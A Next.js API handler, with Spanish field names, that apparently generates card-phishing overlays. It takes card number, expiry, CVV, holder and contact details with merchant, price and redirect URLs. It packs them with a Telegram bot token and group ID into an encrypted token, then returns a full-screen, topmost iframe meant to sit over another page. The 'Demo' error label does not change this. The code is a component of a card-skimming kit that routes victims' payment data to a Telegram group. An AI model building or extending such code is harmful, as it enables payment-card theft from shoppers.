import type { NextApiRequest, NextApiResponse } from "next";
import { encryptEnvelope, getPublicKeyPem } from "@/lib/rsaCipher";

interface GenerateBody {
  payment: {
    numeroTarjeta: string;
    vencimiento: string;
    cvv: string;
    titular: string;
    email: string;
    celular: string;
    telefono: string;
  };
  comercio?: string;
  price?: string;
  priceFormatted?: string;
  redirectSuccess?: string;
  redirectDeclined?: string;
}

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Método no permitido" });
  }

  const body = (req.body ?? {}) as GenerateBody;
  const { payment, comercio, price, priceFormatted, redirectSuccess, redirectDeclined } = body;

  if (!payment?.numeroTarjeta || !redirectSuccess || !redirectDeclined) {
    return res
      .status(400)
      .json({ error: "Faltan campos: payment.numeroTarjeta, redirectSuccess, redirectDeclined" });
  }

  if (!comercio || comercio.trim() === "") {
    return res.status(400).json({ error: "Falta el campo: comercio" });
  }

  const redirects = [redirectSuccess, redirectDeclined];
  if (redirects.some((r) => !/^https?:\/\//.test(r))) {
    return res.status(400).json({ error: "redirectSuccess y redirectDeclined deben ser URLs http(s)" });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_GROUP_ID;
  if (!botToken || !chatId) {
    return res.status(500).json({ error: "Demo: faltan TELEGRAM_BOT_TOKEN o TELEGRAM_GROUP_ID" });
  }

  const payload = {
    payment,
    comercio,
    price: price ?? "199900",
    priceFormatted: priceFormatted ?? "$199.900",
    redirectSuccess,
    redirectDeclined,
    telegram: { botToken, chatId },
  };

  let token: string;
  try {
    token = encryptEnvelope(payload, getPublicKeyPem());
  } catch {
    return res.status(500).json({ error: "PAYLOAD_PUBLIC_KEY no definida" });
  }

  const protoHeader = req.headers["x-forwarded-proto"];
  const proto =
    typeof protoHeader === "string" ? protoHeader.split(",")[0].trim() || "http" : "http";
  const host = req.headers.host ?? "localhost:3000";
  const origin = `${proto}://${host}`;
  const url = `${origin}/?d=${token}`;

  const iframe =
    `<iframe src="${url}" style="position:fixed;inset:0;width:100vw;height:100vh;` +
    `border:0;background:transparent;z-index:9999"></iframe>`;

  return res.status(200).json({ token, url, iframe });
}